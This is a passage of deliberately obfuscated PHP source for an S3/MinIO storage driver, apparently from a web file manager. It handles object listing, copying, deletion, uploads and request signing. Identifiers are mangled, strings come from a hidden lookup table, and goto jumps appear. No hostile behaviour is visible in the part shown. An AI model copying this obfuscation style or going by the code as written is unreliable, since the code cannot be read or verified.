$ioFileOutServer = "\60"; public $config = array(); public function __construct($ûôß£í¨) { set_timeout(); require_once SDK_DIR . $_SERVER[¡“ËÌ§œ][186]; parent::__construct(); $this->_init($ûôß£í¨); } public function _init($€¸¶ìÉö) { $this->config = $€¸¶ìÉö; foreach ($€¸¶ìÉö as $²¤³Õ“Û => $Òİ¸¥‘ˆ) { if (isset($this->{$²¤³Õ“Û})) { $this->{$²¤³Õ“Û} = $Òİ¸¥‘ˆ; } } $this->endpoint = $€¸¶ìÉö[$_SERVER[¡“ËÌ§œ][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Ğ£’¾Æ˜ = "\x76\64") { $this->signVer = $Ğ£’¾Æ˜; $this->client->setSignatureVersion($Ğ£’¾Æ˜); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $·à™ú™ =& $_SERVER[¡“ËÌ§œ]; $ªâ€³¸ = $this->getBucketCors(); if (!$ªâ€³¸ || !is_array($ªâ€³¸)) { return !1; } if ($ªâ€³¸[$·à™ú™[188]] != $·à™ú™[189] || $ªâ€³¸[$·à™ú™[190]] != $·à™ú™[189]) { return !1; } $üÇöª = array_map($·à™ú™[191], $ªâ€³¸[$·à™ú™[192]]); if (!is_array($üÇöª)) { $üÇöª = array(); } $Ö¿ÉÔÜ = array($·à™ú™[193], $·à™ú™[194], $·à™ú™[195], $·à™ú™[196], $·à™ú™[197]); $¡“ÔîÓ• = array_diff($Ö¿ÉÔÜ, $üÇöª); return empty($¡“ÔîÓ•); } public function mkfile($ÄÙĞÏÙ‰, $¥¥¦Ù– = '', $“¤ÍŠä = REPEAT_RENAME) { $·•‚Ñªö = $this->setContent($ÄÙĞÏÙ‰, $¥¥¦Ù–); if ($·•‚Ñªö !== !1) { return $this->getPathOuter($ÄÙĞÏÙ‰); } return !1; } public function mkdir($®Ş±­Œî, $“±ÛŠİë = REPEAT_SKIP) { $·‚ı²Ö¸ =& $_SERVER[¡“ËÌ§œ]; if (empty($®Ş±­Œî) && $®Ş±­Œî !== $·‚ı²Ö¸[198]) { return !1; } if ($“±ÛŠİë && $this->_isFolder($®Ş±­Œî)) { return $this->getPathOuter($®Ş±­Œî); } $õçË©»² = $this->setContent($®Ş±­Œî, $·‚ı²Ö¸[12], !0); if ($õçË©»² !== !1) { return $this->getPathOuter($®Ş±­Œî); } return !1; } public function copyFile($ò’×Çğ€, $ÀêçÍ¡‘, $ÀıÇ¡Š = array()) { $‘Ç×á÷¤ =& $_SERVER[¡“ËÌ§œ]; $–‹µùİÌ = $this->objectMeta($ò’×Çğ€); if (!$–‹µùİÌ) { return !1; } if ($–‹µùİÌ[$‘Ç×á÷¤[76]] <= 1024 * 1024 * 200) { $Ì¢éÌ³Â = $this->client->copyObject($this->bucket, $ò’×Çğ€, $this->bucket, $ÀêçÍ¡‘, $‘Ç×á÷¤[199], $ÀıÇ¡Š); } else { $Ì¢éÌ³Â = $this->client->multiCopyObject($this->bucket, $ò’×Çğ€, $this->bucket, $ÀêçÍ¡‘, $ÀıÇ¡Š); } $Ì¢éÌ³Â = $Ì¢éÌ³Â ? $this->getPathOuter($ÀêçÍ¡‘) : !1; return $Ì¢éÌ³Â; } public function moveFile($Ö½ú‘Ñ, $ä°ŒÅ¿³) { if ($this->copyFile($Ö½ú‘Ñ, $ä°ŒÅ¿³)) { $this->delFile($Ö½ú‘Ñ); return $this->getPathOuter($ä°ŒÅ¿³); } return !1; } public function delFile($”Ú™ğ) { return $this->client->deleteObject($this->bucket, $”Ú™ğ); } public function delFolder($÷àĞÁÑÀ) { $ãÈ¥æá„ =& $_SERVER[¡“ËÌ§œ]; if (!$this->exist($÷àĞÁÑÀ)) { return !0; } $this->listItemCache = !1; $°¡Æ“»ã = $this->fileList($÷àĞÁÑÀ); $this->listItemCache = !0; $©ø¿Ç©ı = trim($÷àĞÁÑÀ, $ãÈ¥æá„[8]) . $ãÈ¥æá„[8]; if (!empty($÷àĞÁÑÀ) && $÷àĞÁÑÀ !== $ãÈ¥æá„[198] && !in_array($©ø¿Ç©ı, $°¡Æ“»ã[$ãÈ¥æá„[82]])) { $°¡Æ“»ã[$ãÈ¥æá„[82]][] = $©ø¿Ç©ı; } $àù‚òÜß = $this->delByBatch($°¡Æ“»ã[$ãÈ¥æá„[83]]); if (!$àù‚òÜß) { return !1; } $àù‚òÜß = $this->delByBatch($°¡Æ“»ã[$ãÈ¥æá„[82]]); if (!$àù‚òÜß) { return !1; } return $this->delFile($©ø¿Ç©ı); } private function delByBatch($µå’Ã€…) { foreach (array_chunk($µå’Ã€…, 1000) as $çÄ›¶—°) { $µ¼ôŠ²Œ = $this->client->deleteObjects($this->bucket, $çÄ›¶—°); if (!$µ¼ôŠ²Œ) { return !1; } } return !0; } public function rename($üîùüˆÁ, $«¦²’Ÿ¥) { return $this->renameObject($üîùüˆÁ, $«¦²’Ÿ¥); } public function listPath($¥Û¤§ŞË, $µï©Ô–å = false) { $æóñÂèÅ =& $_SERVER[¡“ËÌ§œ]; $ïÃ­¡á = $this->fileList($¥Û¤§ŞË, $æóñÂèÅ[8], !0); foreach ($ïÃ­¡á[$æóñÂèÅ[82]] as $î¹ÆØ„· => $ÊÙ¯Å½ä) { $ïÃ­¡á[$æóñÂèÅ[82]][$î¹ÆØ„·] = $this->folderInfo($ÊÙ¯Å½ä, $µï©Ô–å, $ÊÙ¯Å½ä); } foreach ($ïÃ­¡á[$æóñÂèÅ[83]] as $î¹ÆØ„· => $ÊÙ¯Å½ä) { $ïÃ­¡á[$æóñÂèÅ[83]][$î¹ÆØ„·] = $this->fileInfo($ÊÙ¯Å½ä[$æóñÂèÅ[32]], $µï©Ô–å, $ÊÙ¯Å½ä); } return $ïÃ­¡á; } protected function infoChildren($Ç ˆ°Š, &$›·Ê™˜) { $« ì’§ =& $_SERVER[¡“ËÌ§œ]; $¯×õ²»“ = $this->fileList($Ç ˆ°Š, $« ì’§[12], !0); $›·Ê™˜[$« ì’§[78]] += count($¯×õ²»“[$« ì’§[82]]); $›·Ê™˜[$« ì’§[77]] += count($¯×õ²»“[$« ì’§[83]]); foreach ($¯×õ²»“[$« ì’§[83]] as $ê¼ô×Ñë) { if (!$ê¼ô×Ñë || !$ê¼ô×Ñë[$« ì’§[76]]) { continue; } $›·Ê™˜[$« ì’§[76]] += $ê¼ô×Ñë[$« ì’§[76]]; } } private function fileInfo($“İ¼­ò, $„İşáá¨ = false, $ºü‡ø³Ğ = array()) { $™•¤«Ë =& $_SERVER[¡“ËÌ§œ]; $‰Òëâˆ¶ = array($™•¤«Ë[32] => $this->pathThis($“İ¼­ò), $™•¤«Ë[84] => $this->getPathOuter($“İ¼­ò), $™•¤«Ë[33] => $™•¤«Ë[200], $™•¤«Ë[174] => $this->ext($“İ¼­ò), $™•¤«Ë[76] => isset($ºü‡ø³Ğ[$™•¤«Ë[76]]) ? $ºü‡ø³Ğ[$™•¤«Ë[76]] : 0); if ($„İşáá¨) { return $‰Òëâˆ¶; } $‰Òëâˆ¶[$™•¤«Ë[201]] = $‰Òëâˆ¶[$™•¤«Ë[85]] = 0; $‰Òëâˆ¶[$™•¤«Ë[202]] = $‰Òëâˆ¶[$™•¤«Ë[203]] = !0; if (empty($ºü‡ø³Ğ)) { $ºü‡ø³Ğ = $this->objectMeta($“İ¼­ò); if (!$ºü‡ø³Ğ) { return $‰Òëâˆ¶; } } if (isset($ºü‡ø³Ğ[$™•¤«Ë[180]])) { $‰Òëâˆ¶[$™•¤«Ë[85]] = $ºü‡ø³Ğ[$™•¤«Ë[180]]; } if (isset($ºü‡ø³Ğ[$™•¤«Ë[76]])) { $‰Òëâˆ¶[$™•¤«Ë[76]] = $ºü‡ø³Ğ[$™•¤«Ë[76]]; } return $‰Òëâˆ¶; } private function folderInfo($ñÜäÇ«, $«’¿“ = false, $¿ ŞİÜË = array()) { $Û¾—ß¡ =& $_SERVER[¡“ËÌ§œ]; $Š‰¯¡†´ = array($Û¾—ß¡[32] => $this->pathThis($ñÜäÇ«), $Û¾—ß¡[84] => $this->getPathOuter($Û¾—ß¡[8] . $ñÜäÇ«), $Û¾—ß¡[33] => $Û¾—ß¡[75]); if ($«’¿“) { return $Š‰¯¡†´; } $Š‰¯¡†´[$Û¾—ß¡[201]] = $Š‰¯¡†´[$Û¾—ß¡[85]] = 0; $Š‰¯¡†´[$Û¾—ß¡[202]] = $Š‰¯¡†´[$Û¾—ß¡[203]] = !0; if ($ñÜäÇ« == $Û¾—ß¡[12]) { return $Š‰¯¡†´; } if (empty($¿ ŞİÜË)) { $¿ ŞİÜË = $this->objectMeta(trim($ñÜäÇ«, $Û¾—ß¡[8]) . $Û¾—ß¡[8]); } if (isset($¿ ŞİÜË[$Û¾—ß¡[180]])) { $Š‰¯¡†´[$Û¾—ß¡[201]] = $¿ ŞİÜË[$Û¾—ß¡[180]]; } return $Š‰¯¡†´; } private function fileList($±óÌ­å½, $Øçıëæ‡ = '', $Í­ÖŞÄ = 0) { $‰ÛŸÃ© =& $_SERVER[¡“ËÌ§œ]; $üö „×» = rtrim($±óÌ­å½, $‰ÛŸÃ©[8]) . $‰ÛŸÃ©[8]; $à êñ¡¡ = $this->listObjs($üö „×», null, null, $Øçıëæ‡); if (!$à êñ¡¡) { return array($‰ÛŸÃ©[82] => array(), $‰ÛŸÃ©[83] => array()); } $‰‚´ïêË = $å« ¹áŸ = array(); foreach ($à êñ¡¡[$‰ÛŸÃ©[204]] as $ØîôÜœ§) { $‰Š®°Ù = $ØîôÜœ§[$‰ÛŸÃ©[32]]; if ($‰Š®°Ù == $üö „×») { continue; } $…Üğ¿ÆÑ = isset($ØîôÜœ§[$‰ÛŸÃ©[76]]) ? $ØîôÜœ§[$‰ÛŸÃ©[76]] : 0; $æİÄ½«ß = $…Üğ¿ÆÑ == 0 && substr($‰Š®°Ù, strlen($‰Š®°Ù) - 1, 1) == $‰ÛŸÃ©[8] ? !0 : !1; $this->cacheMethodInfoSet($‰Š®°Ù, $æİÄ½«ß, $ØîôÜœ§); if ($æİÄ½«ß) { $‰‚´ïêË[] = $‰Š®°Ù; continue; } $å« ¹áŸ[] = $Í­ÖŞÄ ? $ØîôÜœ§ : $‰Š®°Ù; } foreach ($à êñ¡¡[$‰ÛŸÃ©[205]] as $ØîôÜœ§) { $‰‚´ïêË[] = $ØîôÜœ§[$‰ÛŸÃ©[32]]; $this->cacheMethodInfoSet($ØîôÜœ§[$‰ÛŸÃ©[32]], !0); } $this->cacheMethodInfoSet($±óÌ­å½, !0); return array($‰ÛŸÃ©[82] => $‰‚´ïêË, $‰ÛŸÃ©[83] => $å« ¹áŸ); } private function listObjs($¯³‹Ò²Ø, $¤ªÅÔ = null, $¼‡Ôñ×“ = null, $ö¼Û¨ = null) { $îêÄü¢× =& $_SERVER[¡“ËÌ§œ]; $¯³‹Ò²Ø = trim($¯³‹Ò²Ø, $îêÄü¢×[8]); $’Ô‰ƒİ = empty($¯³‹Ò²Ø) && $¯³‹Ò²Ø !== $îêÄü¢×[198] ? $îêÄü¢×[12] : $¯³‹Ò²Ø . $îêÄü¢×[8]; return $this->client->getBucket($this->bucket, $’Ô‰ƒİ, $¤ªÅÔ, $¼‡Ôñ×“, $ö¼Û¨, !0); } public function has($½ëÆ§É¶, $‡ú€‡ƒ = false, $¦Ö Òô¾ = true) { $³£ê“Ñó =& $_SERVER[¡“ËÌ§œ]; $½ëÆ§É¶ = trim($½ëÆ§É¶, $³£ê“Ñó[8]); $³ÔÁˆ¨ = empty($½ëÆ§É¶) && $½ëÆ§É¶ !== $³£ê“Ñó[198] ? $³£ê“Ñó[12] : $½ëÆ§É¶ . $³£ê“Ñó[8]; $±¡Óó•æ = null; $á¥Ñú = 500; $Š•Òúæ = $³£ê“Ñó[8]; $©¼È•¢æ = $í·ê§† = array(); while (!0) { $Ù¯‹áúø = $this->listObjs($½ëÆ§É¶, $±¡Óó•æ, $á¥Ñú, $Š•Òúæ); if (!$Ù¯‹áúø) { break; } $±¡Óó•æ = $Ù¯‹áúø[$³£ê“Ñó[206]]; $Š —€òÉ = $Ù¯‹áúø[$³£ê“Ñó[204]]; $ú„ÀÖ÷ö = $Ù¯‹áúø[$³£ê“Ñó[205]]; if (empty($Š —€òÉ) && empty($ú„ÀÖ÷ö)) { break; } if (count($Š —€òÉ) == 1 && $Š —€òÉ[0][$³£ê“Ñó[32]] == $³ÔÁˆ¨) { break; } if ($‡ú€‡ƒ) { if (count($Š —€òÉ)) { $Š —€òÉ = array_column($Š —€òÉ, $³£ê“Ñó[32]); $©¼È•¢æ = array_merge($©¼È•¢æ, $Š —€òÉ); } if (count($ú„ÀÖ÷ö)) { $ú„ÀÖ÷ö = array_column($ú„ÀÖ÷ö, $³£ê“Ñó[32]); $í·ê§† = array_merge($í·ê§†, $ú„ÀÖ÷ö); } if ($±¡Óó•æ === null) { break; } continue; } if ($¦Ö Òô¾) { if (!empty($Š —€òÉ)) { if (count($Š —€òÉ) > 1 || isset($Š —€òÉ[0][$³£ê“Ñó[32]]) && $Š —€òÉ[0][$³£ê“Ñó[32]] != $³ÔÁˆ¨) { return !0; } } } else { if (!empty($ú„ÀÖ÷ö)) { return !0; } } if ($±¡Óó•æ === null) { break; } } if ($‡ú€‡ƒ) { $©¼È•¢æ = array_diff($©¼È•¢æ, array($³ÔÁˆ¨)); $©¼È•¢æ = count(array_unique($©¼È•¢æ)); $í·ê§† = count(array_unique($í·ê§†)); return array($³£ê“Ñó[207] => $©¼È•¢æ, $³£ê“Ñó[208] => $í·ê§†); } return !1; } public function listAll($äûŠ¿š“) { $„îœ¿µ =& $_SERVER[¡“ËÌ§œ]; $ıö‹ØÀô = $this->fileList($äûŠ¿š“, $„îœ¿µ[12], !0); $é¢ŸÊİ¸ = array_to_keyvalue($ıö‹ØÀô[$„îœ¿µ[83]], $„îœ¿µ[32]); foreach ($ıö‹ØÀô[$„îœ¿µ[82]] as $ÇÑÇ“Âô) { if (is_string($ÇÑÇ“Âô)) { $é¢ŸÊİ¸[$ÇÑÇ“Âô] = array($„îœ¿µ[76] => 0); } } return $this->listAllFiles($äûŠ¿š“, $é¢ŸÊİ¸); } public function canRead($¡Û¿ä­š) { $ºÚÔ©¸ =& $_SERVER[¡“ËÌ§œ]; $…ŠÖ¥º¦ = $this->client->getAccessControlPolicy($this->bucket, $¡Û¿ä­š); if (!$…ŠÖ¥º¦) { return !1; } return in_array($…ŠÖ¥º¦, array($ºÚÔ©¸[209], $ºÚÔ©¸[210], $ºÚÔ©¸[211])) ? !0 : !1; } public function canWrite($¼öÂ„¡) { $³²Ë€ÂŠ =& $_SERVER[¡“ËÌ§œ]; $¸¡Ìï¼¼ = $this->client->getAccessControlPolicy($this->bucket, $¼öÂ„¡); if (!$¸¡Ìï¼¼) { return !1; } return in_array($¸¡Ìï¼¼, array($³²Ë€ÂŠ[209], $³²Ë€ÂŠ[210])) ? !0 : !1; } public function getContent($ˆì“Å‹) { return $this->client->getObject($this->bucket, $ˆì“Å‹); } public function setContent($ë†ÅôÃ—, $ÏˆÆÀÛŠ = '', $¾íÜ”‹® = false) { $ŠÕƒÄ© =& $_SERVER[¡“ËÌ§œ]; $ë†ÅôÃ— = $¾íÜ”‹® ? trim($ë†ÅôÃ—, $ŠÕƒÄ©[8]) . $ŠÕƒÄ©[8] : $ë†ÅôÃ—; $öÀÜ°®Ó = get_file_mime(get_path_ext($ë†ÅôÃ—)); $øöŠœÅú = $this->client->putObject($ÏˆÆÀÛŠ, $this->bucket, $ë†ÅôÃ—, $ŠÕƒÄ©[199], array(), $öÀÜ°®Ó); if (!$øöŠœÅú) { return !1; } if ($¾íÜ”‹®) { return !0; } $this->cacheMethod(null, null); $øöŠœÅú = $this->copyFile($ë†ÅôÃ—, $ë†ÅôÃ—, array($ŠÕƒÄ©[212] => $øöŠœÅú[$ŠÕƒÄ©[213]])); return $øöŠœÅú ? !0 : !1; } public function fileSubstr($¼éÒµê¥, $ˆÁÃæŠÛ, $ÒÜ¾®Ê¢) { $äÓë‹ãª = $ˆÁÃæŠÛ + $ÒÜ¾®Ê¢ - 1; return $this->client->getObject($this->bucket, $¼éÒµê¥, array($_SERVER[¡“ËÌ§œ][214] => "\142\x79\164\145\163\75{$ˆÁÃæŠÛ}\55{$äÓë‹ãª}")); } public function upload($¯¹Ã±¹š, $ÂÖ˜Ôşï, $ª­ú™¬š = false, $À±‰Ó€£ = REPEAT_REPLACE) { $É§Û ¶ =& $_SERVER[¡“ËÌ§œ]; $şôóÀÉ¨ = array($É§Û ¶[212] => @md5_file($ÂÖ˜Ôşï)); $¹Í§éÉ‘ = array($É§Û ¶[215] => get_file_mime(get_path_ext($¯¹Ã±¹š))); if (IO::size($ÂÖ˜Ôşï) <= 1024 * 1024 * 200) { $éĞÅ³êø = $this->client->putObjectFile($ÂÖ˜Ôşï, $this->bucket, $¯¹Ã±¹š, $É§Û ¶[199], $şôóÀÉ¨, $¹Í§éÉ‘); return !empty($éĞÅ³êø) ? $this->getPathOuter($¯¹Ã±¹š) : !1; } $¯“•“ÛÃ = $this->client->multiUploadObject($ÂÖ˜Ôşï, $this->bucket, trim($¯¹Ã±¹š, $É§Û ¶[8]), $şôóÀÉ¨, $¹Í§éÉ‘); return $¯“•“ÛÃ ? $this->getPathOuter($¯¹Ã±¹š) : !1; } public function download($ÒõâÑİ, $¾×öò‘) { if (!@is_dir($this->pathFather($¾×öò‘)) && !IO::mkdir($this->pathFather($¾×öò‘))) { return !1; } $„°àÛßæ = $this->client->getObject($this->bucket, $ÒõâÑİ, array(), $¾×öò‘); return $„°àÛßæ !== !1 ? $¾×öò‘ : !1; } public function link($æ£ºì”, $¤‘ÖÙ© = array()) { $Áû”Ø® =& $_SERVER[¡“ËÌ§œ]; if ($this->signVer == $Áû”Ø®[216]) { return $this->client->getAuthenticatedURL($this->bucket, $æ£ºì”, 3600 * 12, $¤‘ÖÙ©); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($æ£ºì”, $Áû”Ø®[8]), 3600 * 12, $this->region, array(), !0, $¤‘ÖÙ©); } public function fileOut($ËàÂ¾Ö, $ÔÏËøÉ = false, $€”í›”ï = false, $«åùÉÙÒ = '') { $Ó›´’ùô =& $_SERVER[¡“ËÌ§œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ËàÂ¾Ö, $ÔÏËøÉ, $€”í›”ï, $«åùÉÙÒ); } if (!$€”í›”ï) { $€”í›”ï = $this->pathThis($ËàÂ¾Ö); } $úí‡æ¼ = get_file_mime(get_path_ext($€”í›”ï)); if ($úí‡æ¼ == $Ó›´’ùô[217]) { return parent::fileOut($ËàÂ¾Ö, $ÔÏËøÉ, $€”í›”ï, $«åùÉÙÒ); } $Ñƒî–’ = array($Ó›´’ùô[218] => $úí‡æ¼); if ($ÔÏËøÉ) { $Ñƒî–’[$Ó›´’ùô[219]] = $Ó›´’ùô[220] . rawurlencode($€”í›”ï); } else { } $´ºÉ·èÁ = $this->link($ËàÂ¾Ö, $Ñƒî–’); $this->fileOutLink($´ºÉ·èÁ); } public function fileOutServer($ñŒáî„½, $ãå–¡º = false, $Øˆö’éÀ = false, $­ÎŸÛ¨ö = '') { parent::fileOut($ñŒáî„½, $ãå–¡º, $Øˆö’éÀ, $­ÎŸÛ¨ö); } public function fileOutImageServer($ŠçÆÎÊ, $Œ«›éı¾ = 250) { parent::fileOutImage($ŠçÆÎÊ, $Œ«›éı¾); } public function hashMd5($ª ÉÁ»á, $ª»¦ãş½ = '') { $‘†Ç£·® =& $_SERVER[¡“ËÌ§œ]; $ÁËÌÊı½ = $this->objectMeta($ª ÉÁ»á); if (!$ÁËÌÊı½) { return !1; } $ª»¦ãş½ = $ª»¦ãş½ ? $ª»¦ãş½ : _get($ÁËÌÊı½, $‘†Ç£·®[221]); $ª»¦ãş½ = $ª»¦ãş½ ? $ª»¦ãş½ : _get($ÁËÌÊı½, $‘†Ç£·®[213], $‘†Ç£·®[12]); return $ª»¦ãş½; } public function uploadFormData($ÅñŞšÇó, $²şÎ™û = 3600) { $ÑãŒÙ¦ =& $_SERVER[¡“ËÌ§œ]; $«ñÜ¯È» = $this->pathFather($ÅñŞšÇó); $ÎûœëåË = $this->client->getHttpUploadPostParams($this->bucket, $«ñÜ¯È», $ÑãŒÙ¦[199], $²şÎ™û); return array_merge((array) $ÎûœëåË, array($ÑãŒÙ¦[182] => $this->getHost())); } public function multiUploadFormData($Óã™“±, $Ä©Æâ´• = 3600) { $Ñ…¬‘ª =& $_SERVER[¡“ËÌ§œ]; $‘Å×£²½ = gmdate($Ñ…¬‘ª[222]); $‡ÃşÌšó = array(); $Æ¬¨´ôü = $this->client->getUploadId($this->bucket, $Óã™“±, $‡ÃşÌšó); if (!$Æ¬¨´ôü) { return !1; } return array($Ñ…¬‘ª[223] => $Æ¬¨´ôü, $Ñ…¬‘ª[182] => $this->getHost() . $Ñ…¬‘ª[8] . $this->pathEncode($Óã™“±), $Ñ…¬‘ª[224] => $‘Å×£²½, $Ñ…¬‘ª[94] => $Óã™“±); } public function multiUploadAuthData($ˆí‰©—†, $ĞÕ»æì  = array()) { $”–âä =& $_SERVER[¡“ËÌ§œ]; $´Şö¦æ­ = isset($ĞÕ»æì [$”–âä[224]]) ? $ĞÕ»æì [$”–âä[224]] : gmdate($”–âä[222]); $í·Ø›Â½ = isset($ĞÕ»æì [$”–âä[174]]) ? $ĞÕ»æì [$”–âä[174]] : $”–âä[12]; $Û¶‘µÊ­ = $ĞÕ»æì [$”–âä[94]]; unset($ĞÕ»æì [$”–âä[94]]); if (isset($ĞÕ»æì [$”–âä[225]])) { $ĞÕ»æì [$”–âä[224]] = $´Şö¦æ­; return $this->listUploadParts($Û¶‘µÊ­, $ĞÕ»æì ); } $ŸòğÕ£É = array($”–âä[226], $”–âä[12], $”–âä[120], $”–âä[12], "\170\55\x61\155\x7a\x2d\x64\141\x74\x65\72{$´Şö¦æ­}", $”–âä[8] . $this->bucket . $”–âä[8] . $this->pathEncode($Û¶‘µÊ­) . $í·Ø›Â½); if (strpos($í·Ø›Â½, $”–âä[227]) === 0) { $ŸòğÕ£É[0] = $”–âä[228]; } if (isset($ĞÕ»æì [$”–âä[229]]) && $ĞÕ»æì [$”–âä[229]] == $”–âä[230]) { $ŸòğÕ£É[0] = $”–âä[230]; } $©Êù…²ß = implode($”–âä[231], $ŸòğÕ£É); $ô‰½ü‘¦ = base64_encode(hash_hmac($”–âä[232], $©Êù…²ß, $this->secret, !0)); $…Öí±È = $”–âä[233] . $this->accessKey . $”–âä[4] . $ô‰½ü‘¦; if (strpos($í·Ø›Â½, $”–âä[227]) === 0) { return array($”–âä[234] => $…Öí±È, $”–âä[224] => $´Şö¦æ­); } return $…Öí±È; } public function listUploadParts($¥Áğ€Í , $¤âø®†† = array()) { $ ÄØÌœØ =& $_SERVER[¡“ËÌ§œ]; $‘¿äºŸñ = str_replace($ ÄØÌœØ[235], $ ÄØÌœØ[12], $¤âø®††[$ ÄØÌœØ[174]]); $ªğ¬òØ› = $this->client->listParts($this->bucket, $¥Áğ€Í , $‘¿äºŸñ); if (!$ªğ¬òØ›) { return !1; } unset($¤âø®††[$ ÄØÌœØ[225]], $¤âø®††[$ ÄØÌœØ[229]]); $¤âø®††[$ ÄØÌœØ[94]] = $¥Áğ€Í ; $â‰Ö»Ğ¢ = $this->multiUploadAuthData($¥Áğ€Í , $¤âø®††); if (empty($â‰Ö»Ğ¢)) { return !1; } return array($ ÄØÌœØ[234] => $â‰Ö»Ğ¢, $ ÄØÌœØ[224] => $¤âø®††[$ ÄØÌœØ[224]], $ ÄØÌœØ[236] => $ªğ¬òØ›); } public function getHost() { return parent::getHost() . $_SERVER[¡“ËÌ§œ][8] . $this->bucket; } public function size($×Û©Ê³Ä) { $÷òÃ”™“ = $this->objectMeta($×Û©Ê³Ä); return $÷òÃ”™“ ? $÷òÃ”™“[$_SERVER[¡“ËÌ§œ][76]] : 0; } public function info($³¼Òœ‘Æ) { if ($this->isFolder($³¼Òœ‘Æ)) { return $this->folderInfo($³¼Òœ‘Æ); } else { if ($this->isFile($³¼Òœ‘Æ)) { return $this->fileInfo($³¼Òœ‘Æ); } } return !1; } public function exist($ñ²Ğ…”Ò) { return $this->isFile($ñ²Ğ…”Ò) || $this->isFolder($ñ²Ğ…”Ò); } public function isFile($øè–İĞâ) { return !$this->isFolder($øè–İĞâ) && $this->objectMeta($øè–İĞâ); } public function isFolder($Â­¢À×•) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][165], $Â­¢À×•); } protected function objectMeta($¯Ìâ¿–™) { return $this->cacheMethod($_SERVER[¡“ËÌ§œ][167], $¯Ìâ¿–™); } protected function _objectMeta($ÍıëùÄ) { $©„Ó×é¹ =& $_SERVER[¡“ËÌ§œ]; $ÍıëùÄ = rtrim($ÍıëùÄ, $©„Ó×é¹[8]); try { $­„’ìß¶ = $this->client->getObjectInfo($this->bucket, $ÍıëùÄ); if (!isset($­„’ìß¶[$©„Ó×é¹[221]]) && isset($­„’ìß¶[$©„Ó×é¹[237]])) { $­„’ìß¶[$©„Ó×é¹[221]] = $­„’ìß¶[$©„Ó×é¹[237]]; } } catch (Exception $ğ™¼Õ–à) { $­„’ìß¶ = !1; } if (!$­„’ìß¶) { } return $­„’ìß¶; } protected function _isFolder($ßò‘¥ñˆ) { $°—¿Úå¬ =& $_SERVER[¡“ËÌ§œ]; $ßò‘¥ñˆ = rtrim($ßò‘¥ñˆ, $°—¿Úå¬[8]); if ($ßò‘¥ñˆ == $°—¿Úå¬[12] || $ßò‘¥ñˆ == $°—¿Úå¬[8]) { return !0; } $µ¸£Íİ‚ = $this->client->getBucket($this->bucket, $ßò‘¥ñˆ, null, 1); if (empty($µ¸£Íİ‚[$°—¿Úå¬[204]])) { return !1; } $€§ú×¢ = $µ¸£Íİ‚[$°—¿Úå¬[204]][0][$°—¿Úå¬[32]]; return stripos($€§ú×¢, $ßò‘¥ñˆ . $°—¿Úå¬[8]) === 0 ? !0 : !1; if (substr($€§ú×¢, -1) == $°—¿Úå¬[8]) { return !0; } if (get_path_this($€§ú×¢) == get_path_this($ßò‘¥ñˆ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($û±§¬Ï›) { parent::__construct($û±§¬Ï›); $this->signatureVersion($_SERVER[¡“ËÌ§œ][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($§›‰“‘¥, $ÙÊ©ÎÏ­ = 3600) { $†Ù²ş­ç =& $_SERVER[¡“ËÌ§œ]; $Û™ì¼ú = $†Ù²ş­ç[199]; $Ïˆ”•ÛÌ = $†Ù²ş­ç[238]; $®”ÏŒŸÈ = $†Ù²ş­ç[62]; $£ôİûı¢ = gmdate($†Ù²ş­ç[239]); $‡°óĞÍ¿ = gmdate($†Ù²ş­ç[240]); $Çßª…’Ù = $†Ù²ş­ç[241]; $œÔÌ¥·¹ = $ÙÊ©ÎÏ­ . $†Ù²ş­ç[12]; $“ÆÏ©¦İ = $†Ù²ş­ç[242]; $´è™‚¬Õ = array($this->accessKey, $‡°óĞÍ¿, $this->region, $®”ÏŒŸÈ, $Çßª…’Ù); $†¶Üö† = implode($†Ù²ş­ç[8], $´è™‚¬Õ); $¨³™´¢ = array($†Ù²ş­ç[243] => gmdate($†Ù²ş­ç[244], strtotime($†Ù²ş­ç[245])), $†Ù²ş­ç[246] => array(array($†Ù²ş­ç[247] => $this->bucket), array($†Ù²ş­ç[248] => $Û™ì¼ú), array($†Ù²ş­ç[249], $†Ù²ş­ç[250], $†Ù²ş­ç[12]), array($†Ù²ş­ç[249], $†Ù²ş­ç[251], $†Ù²ş­ç[12]), array($†Ù²ş­ç[249], $†Ù²ş­ç[252], $†Ù²ş­ç[12]), array($†Ù²ş­ç[253] => $“ÆÏ©¦İ), array($†Ù²ş­ç[254] => $†¶Üö†), array($†Ù²ş­ç[255] => $Ïˆ”•ÛÌ), array($†Ù²ş­ç[256] => $£ôİûı¢), array($†Ù²ş­ç[257] => $œÔÌ¥·¹))); $Ç”©¿—ı = base64_encode(json_encode($¨³™´¢)); $æï„Ééï = hash_hmac($†Ù²ş­ç[258], $‡°óĞÍ¿, $†Ù²ş­ç[259] . $this->secret, !0); $Ä‡Ş¦¨È = hash_hmac($†Ù²ş­ç[258], $this->region, $æï„Ééï, !0); $Ú§ğÁûÕ = hash_hmac($†Ù²ş­ç[258], $®”ÏŒŸÈ, $Ä‡Ş¦¨È, !0); $©ğ‡È¿Í = hash_hmac($†Ù²ş­ç[258], $Çßª…’Ù, $Ú§ğÁûÕ, !0); $•Ë®˜äÔ = hash_hmac($†Ù²ş­ç[258], $Ç”©¿—ı, $©ğ‡È¿Í); $æÎŠÔ×ù = array($†Ù²ş­ç[215] => $†Ù²ş­ç[12], $†Ù²ş­ç[260] => $†Ù²ş­ç[12], $†Ù²ş­ç[248] => $Û™ì¼ú, $†Ù²ş­ç[253] => $“ÆÏ©¦İ, $†Ù²ş­ç[261] => $Ç”©¿—ı, $†Ù²ş­ç[262] => $†¶Üö†, $†Ù²ş­ç[263] => $Ïˆ”•ÛÌ, $†Ù²ş­ç[264] => $£ôİûı¢, $†Ù²ş­ç[265] => $œÔÌ¥·¹, $†Ù²ş­ç[266] => $•Ë®˜äÔ, $†Ù²ş­ç[182] => $this->getHost()); return $æÎŠÔ×ù; } } goto C®¤éÒíà; B¿Î¯Ëˆ­ì: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($‰¤ƒş¯) { $this->pathParse = $‰¤ƒş¯; 